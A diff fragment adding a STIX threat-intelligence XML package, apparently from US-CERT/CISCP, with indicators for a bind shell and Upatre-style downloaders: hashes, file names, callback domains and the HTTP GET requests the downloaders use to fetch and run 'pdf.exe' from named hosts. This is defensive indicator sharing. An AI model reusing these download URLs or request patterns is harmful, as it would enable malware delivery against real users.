+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-0d9811dc-f317-40e1-b18b-d2b5dc61ab75" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Packer: Microsoft Visual C++
+Compile Date: 2014-01-21 18:15:44 UTC
+
+The submitted file is a reverse shell utility. When executed, the file opens port 3232, binds to the port, and listens. If a connection is made, the file executes "cmd.exe" in the current working directory and sends the command shell over the open port to the remote host. The data sent over the wire is not obfuscated.
+
+This file was previously identified in another malicious email campaign described in IB-14-10037. The emails used a Barclays theme.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-54390b64-bba4-46f1-8092-88d48c403953">
+        <cybox:Object id="CISCP:Object-52326789-9d17-4c79-ad36-c67f41163aec">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Payment receipt 61665.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">110592</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b149d2a2d6e065113915e2a13766c16a</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d376d02d582b361df59b220a04d3b34ba3bc951f</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">1536:iOLA+kY51slvSZOU4fVRobLe84h0fqUmLu+uaiA0b:iOpFf9/UDELB4h0fzRb</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-019d99c9-9b5f-4a07-bd75-6cdca232d32e" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Packer: Borland Delphi 4.0
+Compile Date: 2012-04-14 12:00:51 UTC
+Call backs: aarushenterprises.com
+4-access.com
+
+Analysis The submitted file is a downloader. During execution, the following events occur:
+A class called, "grita" is registered. The window procedure parameter of the new class points to the function beginning at offset 0x401786. A new window called, "kovice" is created which executes the window procedure.
+A large buffer of shellcode beginning at file offset 0x1087 is decoded. The de-obfuscated code is responsible for the following tasks:
+
+The file checks to see if it is running from the directory:
+"C:\DOCUME~1\ADMINI~1\LOCALS~\Temp\winupdater.exe". If not, the file is copied to the prevsiously mentioned file and executed. If the file is running from the %TEMP% directory, a GET request is sent to the domain, "aarushenterprises.com" via port 443, using HTTPS.
+
+GET /images/icons/pdf.exe HTTP/1.1
+Accept: text/*, application/*
+User-Agent: Updates downloader
+Host: aarushenterprises.com
+Cache-Control: no-cache
+The downloaded file is saved to the directory, "\%TEMP%\slond.exe" and is executed.
+The process then terminates.
+NOTE: An additional URL (4-access.com) was located in the strings within the
+shellcode buffer.
+
+RELEVANT RESOURCE DATA -----&gt;
+Name: Icon Entry
+Label: 1
+Content:
+This resource object contains an icon used for Portable Document Format (PDF) files.
+Name: Manifest
+Label: 1
+Content:
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;assemblyxmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;trustInfoxmlns="urn:schemas-microsoft-com:asm.v3"&gt;&lt;security&gt;&lt;requestedPrivileges&gt;&lt;requestedExecutionLevel level="asInvoker" uiAccess="false"/&gt;&lt;/requestedPrivileges&gt;&lt;/security&gt;&lt;/trustInfo&gt;&lt;/assembly&gt;
+
+RELEVANT STRING DATA -----&gt;
+helk
+edit
+kovice
+static
+grita
+button
+edit
+DECODED STRINGS -----&gt;
+winupdater.exe
+slond.exe
+%s%s
+%s\%s
+open
+Updates downloader
+text/*
+application/*
+aarushenterprises.com
+/images/icons/pdf.exe
+4-access.com
+/images/stories/fruit/pdf.exe</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-0f3c21a4-e453-4905-9218-434157065288">
+        <cybox:Object id="CISCP:Object-e11d9135-ed1f-4790-8851-ce4d3efba01d">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">USPSSIBDSJDSS.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">18944</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">be074c3d9ea0838cd1cbdd957de2cabc</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">0d9c749434d52f23ac859064f999328a15ac2971</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:IbRmmOIt0K/vDxbwpgDi7ZtCtY8alJZjLzu:IbRmUvDX23RZjL</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-341869ae-cbd5-4841-bf07-bd819d6b1183" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>If the file USPSSIBDSJDSS.exe (MD5: be074c3d9ea0838cd1cbdd957de2cabc) is running from the %TEMP% directory, a GET request is sent to the domain, aarushenterprises.com via port 443, using HTTPS.
+
+GET /images/icons/pdf.exe HTTP/1.1
+Accept: text/*, application/*
+User-Agent: Updates downloader
+Host: aarushenterprises.com
+Cache-Control: no-cache
+
+The downloaded file was saved to a directory (\%TEMP%\slond.exe) and executed. The process then terminated.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-9db926f8-d88d-4fc0-9ba6-aba3efea6e44">
+        <cybox:Object id="CISCP:Object-ef92da0b-60a0-4690-8b93-1a357db9402c">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://aarushenterprises.com/images/icons/pdf.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-505a34fc-1cf8-4dc4-9425-53aef19fd6d5" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Domain Watchlist</indicator:Type>
+      <indicator:Description>This domain was located in the strings within the shellcode buffer of the file USPSSIBDSJDSS.exe (MD5: be074c3d9ea0838cd1cbdd957de2cabc).</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-89243a44-50ee-4310-a606-662ad2b97015">
+        <cybox:Object id="CISCP:Object-af7205b9-d785-4c17-8f34-6af565f0268d">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">4-access.com</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-90f87606-461a-4683-b814-d897747c9e42" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Antivirus Kaspersky Trojan.Win32.Bublik.bvez
+McAfee Downloader-FJH
+Microsoft TrojanDownloader:Win32/Upatre.L
+Symantec Downloader.Trojan
+TrendMicro TROJ_UPATRE.HYT
+Packer Borland Delphi 4.0
+Compile Date 2012-04-14 12:02:28 UTC
+Callbacks allindiapackermover.com
+homevisitor.co.uk
+
+Analysis The submitted file is a downloader. During execution, the following events occur:
+A class called, "grita" is registered. The window procedure parameter of the new
+class points to the function beginning at offset 0x401786. A new window called,
+"kovice" is created which executes the window procedure.
+A large buffer of shellcode beginning at file offset 0x1002 is decoded. The
+de-obfuscated code is responsible for the following tasks:
+The file checks to see if it is running from the directory:
+"C:\DOCUME~1\ADMINI~1\LOCALS~ \Temp\realupdater.exe". If not, the file is copied to
+the prevsiously mentioned file and executed. If the file is running from the %TEMP%
+directory, a GET request is sent to the domain, "allindiapackermover.com" via port
+443, using HTTPS.
+GET /images/pdf.exe HTTP/1.1
+Accept: text/*, application/*
+User-Agent: Updates downloader
+Host: allindiapackermover.com
+Cache-Control: no-cache
+The downloaded file is saved to the directory, "\%TEMP%\slonk.exe" and is executed.
+The process then terminates.
+NOTE: An additional URL (homevisitor.co.uk) was located in the strings within the
+shellcode buffer.
+RELEVANT RESOURCE DATA -----&gt;
+Name: Icon Entry
+Label: 1
+Content:
+This resource object contains an icon used for Portable Document Format (PDF) files.
+Name: Manifest
+Label: 1
+Content:
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;assembly
+xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"&gt;&lt;trustInfo
+xmlns="urn:schemas-microsoft-com:asm.v3"&gt;&lt;security&gt;&lt;requestedPrivileges&gt;&lt;requestedEx
+ecutionLevel level="asInvoker"
+uiAccess="false"/&gt;&lt;/requestedPrivileges&gt;&lt;/security&gt;&lt;/trustInfo&gt;&lt;/assembly&gt;
+RELEVANT STRING DATA -----&gt;
+helk
+edit
+kovice
+static
+grita
+button
+US-CERT MIFR-342934 17 of 32
+TLP: GREEN
+TLP: GREEN
+edit
+DECODED STRINGS -----&gt;
+realupdater.exe
+slonk.exe
+%s%s
+%s\%s
+open
+Updates downloader
+text/*
+application/*
+allindiapackermover.com
+/images/pdf.exe
+homevisitor.co.uk
+/images/banners/pdf.exe</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-b3aef4c0-afc3-4ec5-b269-52f9ef400b57">
+        <cybox:Object id="CISCP:Object-01c74e15-7e9b-46c3-8111-eb0cccc17efe">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">report.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">18432</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">ca115cc64402208f5e37f289cf1941b5</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">26a9f016178d314ddf103ef998d1434513f50ffb</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:Idu9LNL1QFars3y3bQpYZRDtY8alJZjLzu:IM9LCWn8ZjL</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ca6832f5-58a6-4a12-bbc2-923c58fcb593" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Observable id="CISCP:Observable-e9da4566-6ed0-4c4d-9ce9-d65113fe6426">
+        <cybox:Object id="CISCP:Object-316dca05-19fc-4f03-bfe0-e6da765991d7">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://allindiapackermover.com/images/pdf.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-2950ed74-8dbf-43ac-94f4-d5f25eb52578" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Domain Watchlist</indicator:Type>
+      <indicator:Description>This domain was listed in the strings within the shellcode buffer of the file report.exe (MD5: ca115cc64402208f5e37f289cf1941b5).</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-877e23b4-0984-4879-b157-526c320bca87">
+        <cybox:Object id="CISCP:Object-e48b68b1-d1f0-4780-a882-4ab9b15fe682">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">homevisitor.co.uk</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-01-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
